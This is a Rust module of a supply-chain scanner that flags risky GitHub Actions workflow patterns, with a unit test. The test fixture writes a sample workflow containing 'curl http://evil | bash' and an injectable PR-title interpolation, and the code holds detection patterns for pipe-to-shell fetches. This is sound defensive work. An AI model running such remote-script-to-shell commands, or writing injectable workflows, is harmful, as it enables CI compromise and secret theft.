//! GitHub Actions workflow risk analysis — a static read of
//! `.github/workflows/*.yml`, the surface source-only SCA tools miss.
//!
//! Line/file-level heuristics (no YAML parse, so malformed or templated
//! workflows don't break it) for the patterns behind the CI supply-chain
//! incidents:
//!
//! - **mutable action refs** — `uses: x@main` / an un-SHA-pinned third-party
//!   action (tj-actions repointed mutable tags: CVE-2025-30066);
//! - **poisoned-pipeline triggers** — `pull_request_target` / `workflow_run`,
//!   worse when they check out the untrusted PR head (the PPE class);
//! - **expression injection** — attacker-controllable `${{ github.event.* }}`
//!   interpolated into a shell step;
//! - **over-scoped token** — `permissions: write-all`;
//! - **self-hosted runners** — untrusted code inside your network;
//! - **`curl … | sh`** — the Codecov uploader pattern.

use std::path::Path;

use crate::analyze::util;
use crate::model::{Category, Finding, Severity};

/// Attacker-controllable event fields that cause shell injection when
/// interpolated into a `run:` step (safe fields like `.number` are excluded).
const INJECTABLE: &[&str] = &[
    "github.event.pull_request.title",
    "github.event.pull_request.body",
    "github.event.pull_request.head.ref",
    "github.event.pull_request.head.label",
    "github.event.issue.title",
    "github.event.issue.body",
    "github.event.comment.body",
    "github.event.review.body",
    "github.event.review_comment.body",
    "github.event.discussion.title",
    "github.event.discussion.body",
    "github.head_ref",
];

/// Is this path a workflow file (`…/.github/workflows/*.yml|yaml`)?
fn is_workflow(path: &Path) -> bool {
    let comps: Vec<String> =
        path.components().map(|c| c.as_os_str().to_string_lossy().to_lowercase()).collect();
    comps.windows(2).any(|w| w[0] == ".github" && w[1] == "workflows")
}

pub fn scan_dir(root: &Path, out: &mut Vec<Finding>) {
    for path in util::walk_files(root, &["yml", "yaml"]) {
        if !is_workflow(&path) {
            continue;
        }
        let Ok(text) = std::fs::read_to_string(&path) else { continue };
        let name = path.file_name().and_then(|s| s.to_str()).unwrap_or("workflow").to_string();
        let mk = |severity: Severity, detail: String| Finding {
            dependency: name.clone(),
            severity,
            category: Category::SensitiveApi,
            detail,
            location: Some(path.display().to_string()),
            evidence: None,
            enrich_url: None,
        };

        // File-level: dangerous trigger, worse with an untrusted checkout.
        let risky_trigger = text.contains("pull_request_target") || text.contains("workflow_run");
        let untrusted_checkout =
            text.contains("head.ref") || text.contains("head.sha") || text.contains("head_ref");
        if risky_trigger && untrusted_checkout {
            out.push(mk(Severity::High,
                "`pull_request_target`/`workflow_run` checks out untrusted PR code and runs it with repo secrets (poisoned-pipeline execution)".into()));
        } else if risky_trigger {
            out.push(mk(Severity::Medium,
                "`pull_request_target`/`workflow_run` runs in a privileged context — audit for untrusted-code execution".into()));
        }

        // File-level: expression injection into a shell step.
        if text.contains("run:")
            && let Some(inj) = INJECTABLE.iter().find(|i| text.contains(**i))
        {
            out.push(mk(Severity::High,
                format!("untrusted `${{{{ {inj} }}}}` may be interpolated into a `run:` step (expression injection)")));
        }

        // File-level: over-scoped token.
        if text.contains("write-all") {
            out.push(mk(Severity::Medium,
                "`permissions: write-all` — the GITHUB_TOKEN is over-scoped for the whole workflow".into()));
        }

        // Line-level checks.
        for line in text.lines() {
            let l = line.trim();
            if let Some(spec) = l.strip_prefix("- uses:").or_else(|| l.strip_prefix("uses:"))
                && let Some((action, severity, why)) = uses_risk(spec.trim())
            {
                out.push(mk(severity, format!("action `{action}` {why}")));
            }
            if l.starts_with("runs-on:") && line.contains("self-hosted") {
                out.push(mk(Severity::Medium,
                    "`runs-on: self-hosted` — untrusted workflow code runs inside your network".into()));
            }
            if (line.contains("curl ") || line.contains("wget "))
                && (line.contains("| sh") || line.contains("|sh") || line.contains("| bash") || line.contains("|bash"))
            {
                out.push(mk(Severity::High,
                    "pipes a remote script straight to a shell (`curl … | sh`) — the Codecov pattern".into()));
            }
        }
    }
}

/// Classify a `uses:` action reference. `None` when it's SHA-pinned, local
/// (`./`) or a docker image — the safe forms.
fn uses_risk(spec: &str) -> Option<(String, Severity, &'static str)> {
    let spec = spec.split('#').next().unwrap_or(spec).trim().trim_matches(|c| c == '"' || c == '\'');
    if spec.starts_with("./") || spec.starts_with("docker://") {
        return None;
    }
    let (action, reference) = spec.split_once('@')?;
    if is_sha(reference) {
        return None; // commit-SHA pinned — the recommended form
    }
    let owner = action.split('/').next().unwrap_or("");
    let branchy = matches!(reference, "main" | "master" | "develop" | "dev" | "latest" | "head" | "HEAD");
    if branchy {
        Some((action.into(), Severity::Medium, "is pinned to a mutable branch — trivially repointed (the tj-actions vector); pin a commit SHA"))
    } else if !matches!(owner, "actions" | "github") {
        Some((action.into(), Severity::Low, "is a third-party action not pinned to a commit SHA (a tag is repointable)"))
    } else {
        None // an official action on a version tag — common, low risk
    }
}

fn is_sha(r: &str) -> bool {
    r.len() == 40 && r.bytes().all(|b| b.is_ascii_hexdigit())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    #[test]
    fn flags_workflow_risks_but_not_clean() {
        let tmp = std::env::temp_dir().join(format!("pm-gha-{}", std::process::id()));
        let _ = fs::remove_dir_all(&tmp);
        fs::create_dir_all(tmp.join(".github/workflows")).unwrap();
        fs::write(tmp.join(".github/workflows/risky.yml"),
            "on: pull_request_target\njobs:\n  x:\n    runs-on: self-hosted\n    steps:\n      - uses: tj-actions/changed-files@main\n      - run: echo ${{ github.event.pull_request.title }}\n      - run: curl http://evil | bash\n").unwrap();
        // A clean workflow: SHA-pinned official action, plain push trigger.
        fs::write(tmp.join(".github/workflows/clean.yml"),
            "on: push\njobs:\n  y:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n").unwrap();

        let mut out = Vec::new();
        scan_dir(&tmp, &mut out);
        let has = |s: &str| out.iter().any(|f| f.detail.contains(s));
        assert!(has("mutable branch"), "tj-actions@main flagged");
        assert!(has("self-hosted"));
        assert!(has("expression injection"));
        assert!(has("Codecov"));
        assert!(has("pull_request_target"));
        assert!(!out.iter().any(|f| f.location.as_deref().is_some_and(|l| l.ends_with("clean.yml"))),
            "the SHA-pinned clean workflow is not flagged");
        let _ = fs::remove_dir_all(&tmp);
    }
}
